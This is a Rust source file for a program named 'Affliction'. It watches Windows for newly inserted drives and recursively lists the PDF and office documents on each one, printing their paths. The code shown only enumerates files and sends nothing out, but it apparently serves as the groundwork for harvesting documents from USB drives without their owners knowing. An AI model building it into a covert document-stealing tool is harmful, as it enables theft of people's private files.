/*
 * Affliction, the better version written with <3 in Rust
 * Copyright (C) 2020 0v3rl0w & contributors
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

use std::io;
use std::process::{Command, exit};
use std::str::from_utf8;
use std::fs::read_dir;

fn get_devices() -> Vec<String> {
	let output_utf8 = Command::new("wmic")
							.args(&["logicaldisk", "get", "name"])
							.output()
							.expect("Failed to run the command !");

	if let Ok(output) = from_utf8(&output_utf8.stdout) {
		let mut result: Vec<&str> = output.split_whitespace().collect::<Vec<&str>>();
		result.remove(0); let result: Vec<String> = result.into_iter().map(|x| String::from(x)).collect();
		return result;
	} else {
		eprintln!("Couldn't interprete the output of the wmic command");
		exit(1);
	}
}

fn find_new_device(start: Vec<String>, now: Vec<String>) -> String {
	for drive in now {
		if !start.contains(&drive) {
			return drive;
		}
	}

	String::from("REMOVED")
}

fn find_documents(dir: String) -> io::Result<Vec<String>> {
	let mut documents: Vec<String> = Vec::new();

	let paths = read_dir(dir)?;
	for entry in paths {
		let entry = entry?;
		let path = entry.path().display().to_string();

		if entry.path().is_dir() {
			let mut subdocuments = find_documents(path)?;
			documents.append(&mut subdocuments);
		} else {
			let mut filename = path.split(".").collect::<Vec<&str>>();
			filename.reverse();
			if vec!["pdf", "xls", "odt", "doc", "docx", "xlsx", "rtf", "xlsm"].contains(&filename[0]) {
				documents.push(path);
			}
		}
	}

	Ok(documents)
}

fn main() {
	let mut start: Vec<String> = get_devices();

	loop {
		if get_devices() != start {
			let mut new_drive = find_new_device(start.clone(), get_devices());

			if new_drive == "REMOVED" {
				start = get_devices();
			} else {
				new_drive.push('\\');
				if let Ok(paths) = find_documents(new_drive) {
					println!("{:?}", paths);
				}

				start = get_devices();
			}
		}
	}
}
